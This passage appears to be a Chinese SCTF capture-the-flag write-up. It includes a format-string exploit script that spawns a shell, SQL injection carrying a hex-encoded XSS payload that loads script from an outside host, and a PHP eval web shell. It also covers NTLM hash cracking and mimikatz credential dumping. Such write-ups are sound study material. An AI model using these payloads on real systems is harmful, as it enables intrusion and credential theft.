&nbsp;&nbsp;main()</pre><p>&nbsp;<br/></p><p style="margin-left:28px"><span style="font-family:Wingdings">l<span style="font:9px &#39;Times New Roman&#39;">&nbsp; </span></span><strong>CODE200</strong></p><p><strong>&nbsp;</strong></p><p><span style="font-family:宋体">题目的意思是：知道一个数，分解为若干</span>(-2)^i<span style="font-family:宋体">的和，</span>i<span style="font-family:宋体">是位数</span>,<span style="font-family:宋体">求</span>i<span style="font-family:宋体">的组合。</span></p><p><span style="font-family:宋体">如</span></p><p>eg1<span style="font-family:宋体">：</span></p><p>202</p><p>&nbsp;8 7 6 4 3 2 1</p><p>202=(-2)^8+(-2)^7+(-2)^6+(-2)^4+(-2)^3+(-2)^2+(-2)^1</p><p>=256-128+64+16-8+4-2</p><p>eg2<span style="font-family:宋体">：</span></p><p>515</p><p>&nbsp;10 9 2 1 0</p><p>515=(-2)^10+(-2)^9+(-2)^2+(-2)^1+(-2)^0</p><p><span style="font-family:宋体">解法与</span>10<span style="font-family:宋体">进制转</span>2<span style="font-family:宋体">进制类似，不过要注意每位的正负不同</span></p><p><span style="font-family:宋体">代码：</span></p><pre class="brush:python;toolbar:false;">from&nbsp;socket&nbsp;import&nbsp;*
&nbsp;
HOST=&#39;218.2.197.248&#39;
PORT=10007
&nbsp;
s&nbsp;=&nbsp;socket(AF_INET,&nbsp;SOCK_STREAM)
s.connect((HOST,PORT))
while&nbsp;True:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;input=int(s.recv(1024),10)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;input
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;step=0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ans=&#39;&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;list=[]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;input:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;step%2==0:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flag=-1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flag=1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;input%2==1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;input=input+flag
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;list.append(str(step))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;input=input/2
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;step=step+1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;list.reverse()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;list:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ans=ans+&#39;&nbsp;&#39;+&nbsp;i
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;ans
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s.send(ans)
&nbsp;
s.close()</pre><p>&nbsp;<br/></p><p><span style="font-size:18px;font-family:&#39;Simsun&#39;,&#39;serif&#39;;color:black">&nbsp;</span></p><p class="MsoListParagraph" style="margin-left:28px"><span style="font-size:18px;font-family:Wingdings;color:black">l<span style="font:9px &#39;Times New Roman&#39;">&nbsp; </span></span><strong><span style="font-size:18px;font-family:&#39;Simsun&#39;,&#39;serif&#39;;color:black">Misc300</span></strong></p><p><strong>内网攻击数据包分析</strong><strong><br/> <span style="background:silver">FLAG</span></strong><strong>格式</strong><strong>: SCTF{syclover</strong><strong>用户的明文</strong><strong>}&nbsp;</strong><a href="http://download.sycsec.com/misc/b48d97c14a09217ee8cc1d586ca14e2f.pcap" target="_blank"><strong>Download</strong></a></p><p>LINK<span style="font-family:宋体">：</span>http://download.sycsec.com/misc/b48d97c14a09217ee8cc1d586ca14e2f.pcap</p><p><span style="font-family:宋体;color:black">下载后发现这个包很小，主要关注到</span><span style="color:black">smb</span><span style="font-family:宋体;color:black">协议的数据包。</span></p><p><span style="font-family:宋体;color:black">按照题目的意思，需要获取到</span><span style="color:black">syclover</span><span style="font-family:宋体;color:black">的明文密码，这应该就是一个内网的</span><span style="color:black">smb</span><span style="font-family:宋体;color:black">劫持攻击了，查看了</span><span style="color:black">smb</span><span style="font-family:宋体;color:black">包里面的</span><span style="color:black">challenge</span><span style="font-family:宋体;color:black">值确实也是</span><span style="color:black">1122334455667788</span></p><p style="text-align:center"><span style="color: black"><img style="width: 600px;height: 237px" alt="t019232ec692e66b1b0.png" src="http://p7.qhimg.com/t019232ec692e66b1b0.png" title="t019232ec692e66b1b0.png" height="237" vspace="0" width="600" border="0"/></span></p><p><span style="font-family:宋体;color:black">抓到</span><span style="color:black">hash</span><span style="font-family:宋体;color:black">是：</span></p><p><span style="color:black">LMHASH:9e94258a03356914b15929fa1d2e290fab9c8f9f01999448</span></p><p><span style="color:black">NTHASH:013f3cb06ba848f98a6ae6cb4a76477c5ba4e45cda73b475</span></p><p><span style="font-family:宋体;color:black">去下载了个</span><span style="color:black">16G</span><span style="font-family:宋体;color:black">的彩虹表。</span></p><p><span style="font-family:宋体;color:black">开始</span><span style="color:black">halflmchall hash</span><span style="font-family:宋体;color:black">攻击。</span></p><p><span style="font-family:宋体;color:black">使用工具</span><span style="color:black">rcracki_mt</span><span style="font-family:宋体;color:black">先猜解前几位（不区分大小写）很快破解出结果</span></p><p style="text-align:center"><span style="color: black"><img style="width: 600px;height: 367px" alt="t01b95ed6d9b8109917.png" src="http://p9.qhimg.com/t01b95ed6d9b8109917.png" title="t01b95ed6d9b8109917.png" height="367" vspace="0" width="600" border="0"/></span></p><p><span style="font-family:宋体;color:black">前七位：</span><span style="color:black">NETLMIS</span></p><p><span style="font-family:宋体;color:black">接下来继续使用破解出来的字符串做种子破解整个密码，使用到</span><span style="color:black">john-ntlm.pl,</span></p><p><span style="font-family:宋体;color:black">现将</span><span style="color:black">hash</span><span style="font-family:宋体;color:black">保存成如下格式：</span></p><p><span style="color:black">syclover::ROOT-53DD5427BC:013f3cb06ba848f98a6ae6cb4a76477c5ba4e45cda73b475:9e94258a03356914b15929fa1d2e290fab9c8f9f01999448:1122334455667788</span></p><p><span style="font-family:宋体;color:black">执行：</span></p><p><span style="color:black">./john-netntlm.pl&nbsp; --seed &quot;NETLMIS&quot; --file /tmp/1.txt</span></p><p><span style="font-family:宋体;color:black">得到最终的用户密码为：</span></p><p><span style="color:black">NetLMis666</span></p><p><span style="font-family:宋体;color:black">那么</span><span style="color:black">FLAG:</span></p><p><span style="color:black">SCTF{NetLMis666}</span></p><p><span style="font-family:宋体;color:black">本解题方法大量参考看雪某文章，原帖贴出：</span></p><p><a href="http://bbs.pediy.com/showthread.php?p=1203990">http://bbs.pediy.com/showthread.php?p=1203990</a></p><p><span style="color:black">&nbsp;</span></p><p>pwn300</p><p><span style="font-family:宋体">在</span>print message<span style="font-family:宋体">里有个格式化字符串漏洞，同时有个把字符串</span>copy<span style="font-family:宋体">到栈里有利于利用。</span></p><p style="text-align:center"><img style="width: 600px;height: 138px" alt="t01680e4f63bfe1adfc.png" src="http://p9.qhimg.com/t01680e4f63bfe1adfc.png" title="t01680e4f63bfe1adfc.png" height="138" vspace="0" width="600" border="0"/></p><p>&nbsp;</p><p>Exp<span style="font-family:宋体">如下</span></p><p></p><pre class="brush:python;toolbar:false">#coding:utf-8
__author__&nbsp;=&nbsp;&#39;Dazdingo&#39;
&nbsp;
from&nbsp;socket&nbsp;import&nbsp;*
import&nbsp;struct
import&nbsp;time
import&nbsp;threading
import&nbsp;sys
&nbsp;
is_recv&nbsp;=&nbsp;True
&nbsp;
sock_host&nbsp;=&nbsp;&#39;192.168.206.130&#39;
sock_port&nbsp;=&nbsp;8080
&nbsp;
S&nbsp;=&nbsp;socket(AF_INET,&nbsp;SOCK_STREAM)
&nbsp;
def&nbsp;send(ss,&nbsp;tail&nbsp;=&nbsp;&#39;&#39;,&nbsp;r&nbsp;=&nbsp;False):
&nbsp;&nbsp;global&nbsp;S
&nbsp;&nbsp;if&nbsp;tail:
&nbsp;&nbsp;&nbsp;&nbsp;ss&nbsp;+=&nbsp;tail
&nbsp;&nbsp;print&nbsp;ss
&nbsp;&nbsp;S.send(ss)
&nbsp;&nbsp;if&nbsp;r:
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;S.recv(1024)
&nbsp;
def&nbsp;recv_until(str):
&nbsp;&nbsp;data&nbsp;=&nbsp;S.recv(1024)
&nbsp;&nbsp;e&nbsp;=&nbsp;data.find(str)
&nbsp;&nbsp;while&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;e&nbsp;==&nbsp;-1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;S.recv(1025)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e&nbsp;=&nbsp;data.find(str)
&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
&nbsp;
&nbsp;&nbsp;return&nbsp;data,&nbsp;e
&nbsp;
def&nbsp;outputrecv():
&nbsp;&nbsp;global&nbsp;S
&nbsp;&nbsp;while&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;is_recv:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;=&nbsp;&nbsp;S.recv(1024)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;i:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.stdout.write(i)
&nbsp;
def&nbsp;start_recv():
&nbsp;&nbsp;#start&nbsp;recv
&nbsp;&nbsp;t&nbsp;=&nbsp;threading.Thread(target&nbsp;=&nbsp;outputrecv,&nbsp;&nbsp;args&nbsp;=&nbsp;())
&nbsp;&nbsp;t.daemon&nbsp;=&nbsp;True
&nbsp;&nbsp;t.start()
&nbsp;
def&nbsp;get_shell():
&nbsp;&nbsp;#start&nbsp;recv
&nbsp;&nbsp;start_recv()
&nbsp;
&nbsp;&nbsp;global&nbsp;S
&nbsp;&nbsp;while&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(0.1)
&nbsp;&nbsp;&nbsp;&nbsp;ss&nbsp;=&nbsp;raw_input()&nbsp;+&nbsp;&#39;\n&#39;
&nbsp;&nbsp;&nbsp;&nbsp;S.send(ss)
&nbsp;
&nbsp;
def&nbsp;main():
&nbsp;&nbsp;global&nbsp;S
&nbsp;
&nbsp;&nbsp;if&nbsp;len(sys.argv)&nbsp;==&nbsp;3:
&nbsp;&nbsp;&nbsp;&nbsp;sock_host&nbsp;=&nbsp;sys.argv[1]
&nbsp;&nbsp;&nbsp;&nbsp;sock_port&nbsp;=&nbsp;int(sys.argv[2])
&nbsp;
&nbsp;&nbsp;S.connect((sock_host,&nbsp;sock_port))
&nbsp;
&nbsp;&nbsp;a&nbsp;=&nbsp;raw_input(&#39;pause&#39;)
&nbsp;&nbsp;print&nbsp;S.recv(1024)
&nbsp;
&nbsp;&nbsp;send(&#39;2\n&#39;,&nbsp;r&nbsp;=&nbsp;1)
&nbsp;&nbsp;send(&#39;%279$x\n&#39;,&nbsp;r&nbsp;=&nbsp;1)
&nbsp;&nbsp;send(&#39;3\n&#39;)
&nbsp;
&nbsp;&nbsp;data,&nbsp;e&nbsp;=&nbsp;recv_until(&#39;message&nbsp;is:&#39;)
&nbsp;&nbsp;print&nbsp;data,&nbsp;e
&nbsp;&nbsp;leak_memory&nbsp;=&nbsp;int(data[e+11:e+19],&nbsp;16)
&nbsp;
&nbsp;&nbsp;send(&#39;2\n&#39;,&nbsp;r&nbsp;=&nbsp;1)
&nbsp;&nbsp;send(&#39;%266$x\n&#39;,&nbsp;r&nbsp;=&nbsp;1)
&nbsp;&nbsp;send(&#39;3\n&#39;)
&nbsp;
&nbsp;&nbsp;data,&nbsp;e&nbsp;=&nbsp;recv_until(&#39;message&nbsp;is:&#39;)
&nbsp;&nbsp;print&nbsp;data,&nbsp;e
&nbsp;&nbsp;ebp&nbsp;=&nbsp;int(data[e+11:e+19],&nbsp;16)
&nbsp;
&nbsp;&nbsp;call_system&nbsp;=&nbsp;leak_memory&nbsp;+&nbsp;0x25E24
&nbsp;
&nbsp;&nbsp;s&nbsp;=&nbsp;hex(call_system)
&nbsp;&nbsp;print&nbsp;&#39;call_system,&nbsp;ebp&nbsp;is&#39;,&nbsp;s,&nbsp;hex(ebp)
&nbsp;
&nbsp;&nbsp;ret_add1&nbsp;&nbsp;=&nbsp;struct.pack(&#39;I&#39;,&nbsp;ebp-0x2c)
&nbsp;&nbsp;ret_add2&nbsp;&nbsp;=&nbsp;struct.pack(&#39;I&#39;,&nbsp;ebp-0x2a)
&nbsp;&nbsp;arg0&nbsp;=&nbsp;struct.pack(&#39;I&#39;,&nbsp;ebp-0x24)
&nbsp;&nbsp;arg1&nbsp;=&nbsp;struct.pack(&#39;I&#39;,&nbsp;ebp-0x20)
&nbsp;
&nbsp;&nbsp;num_send1&nbsp;=&nbsp;int(s[6:10],&nbsp;16)
&nbsp;&nbsp;num_send2&nbsp;=&nbsp;int(s[2:6],&nbsp;16)&nbsp;-&nbsp;num_send1
&nbsp;
&nbsp;&nbsp;send(&#39;2\n&#39;,&nbsp;r&nbsp;=&nbsp;1)
&nbsp;&nbsp;&nbsp;send(&#39;%16$n%17$n%&#39;+&nbsp;str(num_send1)&nbsp;+&nbsp;&#39;x%18$n%&#39;&nbsp;+&nbsp;str(num_send2)&nbsp;+&nbsp;&nbsp;&#39;x%19$n&#39;&nbsp;+&nbsp;&#39;\x20&#39;*(12-len(str(num_send1))-len(str(num_send2)))&nbsp;+&nbsp;arg0&nbsp;+&nbsp;&nbsp;arg1&nbsp;+ret_add1&nbsp;+ret_add2&nbsp;+&nbsp;&#39;\n&#39;,&nbsp;r&nbsp;=&nbsp;1)
&nbsp;&nbsp;send(&#39;3\n&#39;,&nbsp;r&nbsp;=&nbsp;1)
&nbsp;
&nbsp;&nbsp;get_shell()
&nbsp;
&nbsp;
if&nbsp;__name__&nbsp;==&nbsp;&#39;__main__&#39;:
&nbsp;&nbsp;main()</pre><p><span style="color:black"></span><br/></p><p class="MsoListParagraph" style="margin-left:28px"><span style="font-family:Wingdings;color:black">l<span style="font:9px &#39;Times New Roman&#39;">&nbsp; </span></span><strong><span style="color:black">PT400</span></strong></p><p><span style="font-family:宋体">在</span>blog<span style="font-family:宋体">的左下角发现网站</span><a href="http://idc.sycsec.com/">http://idc.sycsec.com/</a></p><p style="text-align:center"><img style="width: 600px;height: 317px" alt="t017008f88882bba27f.png" src="http://p3.qhimg.com/t017008f88882bba27f.png" title="t017008f88882bba27f.png" height="317" vspace="0" width="600" border="0"/></p><p><a href="http://idc.sycsec.com/index.php?page=2">http://idc.sycsec.com/index.php?page=2</a></p><p><span style="font-family:宋体">存在注入，联合查询，字段数为</span>1<span style="font-family:宋体">，可以注入</span></p><p><span style="font-family:宋体">获得管理员的密码</span></p><p>+----+---------+------------------+----------------------------------+<br/> |&nbsp;id&nbsp;|&nbsp;IsAdmin&nbsp;|&nbsp;UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;UserPass&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br/> +----+---------+------------------+----------------------------------+<br/> |&nbsp;1&nbsp;&nbsp;|&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;administratoroot&nbsp;|&nbsp;89479a64d0965246c032d813efd7d360&nbsp;|<br/> |&nbsp;2&nbsp;&nbsp;|&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;iamguest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;084e0343a0486ff05530df6c705c8bb4&nbsp;|<br/> +----+---------+------------------+----------------------------------+</p><p><span style="font-family:宋体">在网站首页的左下角发现一个</span>bug report<span style="font-family:宋体">页面</span></p><p style="text-align:center"><img style="width: 600px;height: 303px" alt="t01514ab556546662db.png" src="http://p1.qhimg.com/t01514ab556546662db.png" title="t01514ab556546662db.png" height="303" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">通过</span>sql<span style="font-family:宋体">注入来构造一个</span>xss<span style="font-family:宋体">页面</span></p><p><a href="http://idc.sycsec.com/?page=-1%0Aunion%0Aselect%0A0x3C736372697074207372633D22687474703A2F2F6573752E696D2F702E6A73223E3C2F7363726970743E--">http://idc.sycsec.com/?page=-1%0Aunion%0Aselect%0A0x3C736372697074207372633D22687474703A2F2F6573752E696D2F702E6A73223E3C2F7363726970743E--</a>+</p><p><span style="font-family:宋体">提交给管理员后打到后台地址</span></p><p style="text-align:center"><img style="width: 600px;height: 190px" alt="t01bdb0c9e05da0d9ef.png" src="http://p2.qhimg.com/t01bdb0c9e05da0d9ef.png" title="t01bdb0c9e05da0d9ef.png" height="190" vspace="0" width="600" border="0"/></p><p><a href="http://idc.sycsec.com/c80e93890227fbda63cfc29486ce041e/">http://idc.sycsec.com/c80e93890227fbda63cfc29486ce041e/</a></p><p><span style="font-family:宋体">用之前注入出的用户名登陆</span></p><p style="text-align:center"><img style="width: 600px;height: 109px" alt="t01c4ca2e714157b595.png" src="http://p9.qhimg.com/t01c4ca2e714157b595.png" title="t01c4ca2e714157b595.png" height="109" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">上传，经过</span>fuzz<span style="font-family:宋体">测试，无法上传带有“</span>&lt;?<span style="font-family:宋体">”的上传文件</span></p><p><span style="font-family:宋体">于是上传如下脚本，通过</span></p><p>&lt;script language=&quot;php&quot;&gt;eval($_POST[a]);&lt;/script&gt;</p><p><span style="font-family:宋体">之后在服务器上没有太多发现，只有一份</span>wordpress<span style="font-family:宋体">的源码。</span></p><p><span style="font-family:宋体">下载下来之后和官方进行比对，发现在</span></p><p><a href="http://blog.sycsec.com/fc0ea94c722b1fd7f9257f3087ac45d1/wp-includes/revision.php">http://blog.sycsec.com/fc0ea94c722b1fd7f9257f3087ac45d1/wp-includes/revision.php</a></p><p><span style="font-family:宋体">文件中被加入了后门</span></p><p style="text-align:center"><span style="font-size: 16px;font-family: 宋体"><img style="width: 600px;height: 254px" alt="t01ad2ea890134b97ab.jpg" src="http://p2.qhimg.com/t01861e658f6b349711.jpg" title="t01ad2ea890134b97ab.jpg" height="254" vspace="0" width="600" border="0"/></span></p><p><span style="font-family:宋体">计算出</span>wp-sesion<span style="font-family:宋体">为下列值中的任意一个，就可以通过</span>assert<span style="font-family:宋体">来执行任意代码。</span></p><p><span style="font-size:10px;font-family:&#39;微软雅黑&#39;,&#39;sans-serif&#39;;color:black">P1B7R0D<br/> Q0C6S1E<br/> R3@5P2F<br/> S2A4Q3G<br/> T5F3V4@<br/> U4G2W5A<br/> V7D1T6B<br/> W6E0U7C</span></p><p><span style="font-family:宋体">通过</span>hatchet<span style="font-family:宋体">来连接后门，在数据库中获得</span>flag</p><p style="text-align:center"><span style="font-size: 16px;font-family: 宋体"><img style="width: 600px;height: 235px" alt="t01a0bbebd0e49d0f52.jpg" src="http://p2.qhimg.com/t0178295f525498c4e2.jpg" title="t01a0bbebd0e49d0f52.jpg" height="235" vspace="0" width="600" border="0"/></span></p><p><span style="color:black">&nbsp;</span></p><p><span style="color:black">&nbsp;</span></p><p style="margin-left:28px"><span style="font-family:Wingdings;color:black">l<span style="font:9px &#39;Times New Roman&#39;">&nbsp; </span></span><strong><span style="color:black">Misc400a</span></strong></p><p><strong>这是捕获的黑客攻击数据包，</strong><strong>LateRain</strong><strong>用户的密码在此次攻击中泄露了，你能找到吗？</strong><strong><br/> <span style="background:silver">FLAG</span></strong><strong>格式：</strong><strong>SCTF{LateRain</strong><strong>的明文密码</strong><strong>}</strong><strong><br/> </strong><a href="http://download.sycsec.com/misc/ca7ddad530b04af3b3486a5c75fcf18b.zip" target="_blank"><strong>Download</strong></a></p><p>LINK: <a href="http://download.sycsec.com/misc/ca7ddad530b04af3b3486a5c75fcf18b.zip">http://download.sycsec.com/misc/ca7ddad530b04af3b3486a5c75fcf18b.zip</a></p><p>&nbsp;</p><p><span style="font-family:宋体">下载了数据包，发现数据量很多。经过剔除，可以发现里面有少量</span>http<span style="font-family:宋体">包。估计</span>pcap<span style="font-family:宋体">包中大量的</span>tcp<span style="font-family:宋体">数据是为了做炮灰的。</span></p><p><span style="font-family:宋体">一个</span>http<span style="font-family:宋体">数据包的内容如下：</span></p><p style="text-align:center"><span style="color: black"><img style="width: 600px;height: 360px" alt="t017aeecf3e0c9c0a58.png" src="http://p6.qhimg.com/t017aeecf3e0c9c0a58.png" title="t017aeecf3e0c9c0a58.png" height="360" vspace="0" width="600" border="0"/></span></p><p><span style="font-family:宋体;color:black">明眼人一眼看出这应该是个菜刀的数据包，</span><span style="color:black">config.php</span><span style="font-family:宋体;color:black">应该是被入侵后的一句话木马。</span></p><p><span style="font-family:宋体;color:black">整个</span><span style="color:black">pcap</span><span style="font-family:宋体;color:black">中大概就几十条</span><span style="color:black">http</span><span style="font-family:宋体;color:black">的数据流，一条一条看下来。发现入侵者用</span><span style="color:black">winrar</span><span style="font-family:宋体;color:black">打包了一个文件，然后下载了该文件。</span></p><p><span style="font-family:宋体;color:black">用</span><span style="color:black">wireshark</span><span style="font-family:宋体;color:black">可以直接提取出该</span><span style="color:black">rar</span><span style="font-family:宋体;color:black">文件。</span></p><p><span style="font-family:宋体;color:black">而这是一个加密的</span><span style="color:black">rar</span><span style="font-family:宋体;color:black">文件，将菜刀</span><span style="color:black">post</span><span style="font-family:宋体;color:black">过去的关键数据</span><span style="color:black">base64</span><span style="font-family:宋体;color:black">解密一下，发现使用了该命令打包。</span></p><p style="text-align:center"><span style="color: black"><img style="width: 600px;height: 414px" alt="t017ccfdb735788e1fd.png" src="http://p0.qhimg.com/t017ccfdb735788e1fd.png" title="t017ccfdb735788e1fd.png" height="414" vspace="0" width="600" border="0"/></span></p><p><span style="color:black">C:\progra~1\WinRAR\rar a C:\Inetpub\wwwroot\backup\wwwroot.rar C:\Inetpub\wwwroot\backup\1.gif –hpJJBoom</span></p><p><span style="font-family:宋体;color:black">密码就是</span><span style="color:black">JJBoom</span></p><p><span style="font-family:宋体;color:black">解开压缩包得到一个</span><span style="color:black">1.gif,</span><span style="font-family:宋体;color:black">使用</span><span style="color:black">c32asm</span><span style="font-family:宋体;color:black">打开，</span></p><p style="text-align:center"><span style="color: black"><img style="width: 600px;height: 309px" alt="t0154f08c6b9a9f7415.png" src="http://p8.qhimg.com/t0154f08c6b9a9f7415.png" title="t0154f08c6b9a9f7415.png" height="309" vspace="0" width="600" border="0"/></span></p><p><span style="font-family:宋体;color:black">根据文件头</span><span style="color:black">MDMP</span><span style="font-family:宋体;color:black">，知道这是一个内存的</span><span style="color:black">dump</span><span style="font-family:宋体;color:black">文件。</span></p><p><span style="font-family:宋体;color:black">载入到神器</span><span style="color:black">mimikatz</span><span style="font-family:宋体;color:black">中</span></p><p><span style="font-family:宋体;color:black">使用两条命令</span></p><p><span style="color:black">mimikatz # sekurlsa::minidump 1.dmp</span></p><p><span style="color:black">//</span><span style="font-family:宋体;color:black">载入</span><span style="color:black">dmp</span><span style="font-family:宋体;color:black">文件</span></p><p><span style="color:black">mimikatz # sekurlsa::logonPasswords full</span></p><p><span style="color:black">//</span><span style="font-family:宋体;color:black">读取登陆密码</span></p><p style="text-align:center"><span style="color: black"><img style="width: 600px;height: 182px" alt="t0114876c6fa7a4966c.png" src="http://p9.qhimg.com/t0114876c6fa7a4966c.png" title="t0114876c6fa7a4966c.png" height="182" vspace="0" width="600" border="0"/></span></p><p><span style="font-family:宋体;color:black">密码是</span><span style="color:black">&lt;TAB&gt;&lt;SPACE&gt;</span><span style="font-family: 宋体;color:black">。</span></p><p><span style="font-family:宋体;color:black">但是这不是</span><span style="color:black">flag</span><span style="font-family:宋体;color:black">。。</span></p><p><span style="font-family:宋体;color:black">因为</span><span style="color:black">&lt;TAG&gt;&lt;SPACE&gt;</span><span style="font-family: 宋体;color:black">后面还有空格。。</span></p><p><span style="font-family:宋体;color:black">要先</span><span style="color:black">log</span><span style="font-family:宋体;color:black">，把输出都输出到一个</span><span style="color:black">txt</span><span style="font-family:宋体;color:black">里查看。</span></p><p style="text-align:center"><span style="color: black"><img style="width: 600px;height: 362px" alt="t0118a1246e8288b0d2.png" src="http://p9.qhimg.com/t0118a1246e8288b0d2.png" title="t0118a1246e8288b0d2.png" height="362" vspace="0" width="600" border="0"/></span></p><p><span style="color:black">FLAG</span><span style="font-family:宋体;color:black">：</span></p><p><span style="color:black">SCTF{</span> <span style="color:black">&lt;TAB&gt;&lt;SPACE&gt;&nbsp;&nbsp;&nbsp;&nbsp; }</span></p><p><span style="color:black">&nbsp;</span></p><p><span style="color:black">PS:</span><span style="font-family:宋体;color:black">本题是赛后才做出来的。我们队没有把这道题做出来，我们队以为又是</span><span style="color:black">SMB</span><span style="font-family:宋体;color:black">攻击。（另外最坑爹的是比赛时某位屌丝队友都用</span><span style="color:black">foremost</span><span style="font-family:宋体;color:black">拿到了</span><span style="color:black">rar</span><span style="font-family:宋体;color:black">还不说）</span></p><p><span style="color:black">&nbsp;</span></p><p><span style="color:black">&nbsp;</span></p><p class="MsoListParagraph" style="margin-left:28px"><span style="font-size:19px;font-family:Wingdings">l<span style="font:9px &#39;Times New Roman&#39;">&nbsp; </span></span><strong><span style="font-size:19px">RE200</span></strong></p><p><span style="font-family:宋体">题目描述：</span></p><p style="text-align:center"><img style="width: 600px;height: 124px" alt="t01b5b93247b76fc6cd.jpg" src="http://p0.qhimg.com/t01b81b452200d65598.jpg" title="t01b5b93247b76fc6cd.jpg" height="124" vspace="0" width="600" border="0"/></p><p><span style="font-family:宋体">下载下来是个</span>APK<span style="font-family:宋体">文件。</span></p><p><span style="font-family:宋体">解压，</span>Dex2jar<span style="font-family:宋体">反编译，得到源码，看</span>MainActivity.java</p><p><span style="font-family:宋体">分析关键位置，可以看出</span>func<span style="font-family:宋体">函数返回为真，则可</span>toast<span style="font-family:宋体">出</span>Flag<span style="font-family:宋体">。</span></p><p><span style="font-family:宋体">于是分析</span>func<span style="font-family:宋体">函数，先解密各个字符串，基本上都是</span>-1<span style="font-family:宋体">，</span>-2<span style="font-family:宋体">，</span>-3<span style="font-family:宋体">简易加密的。</span></p><p><span 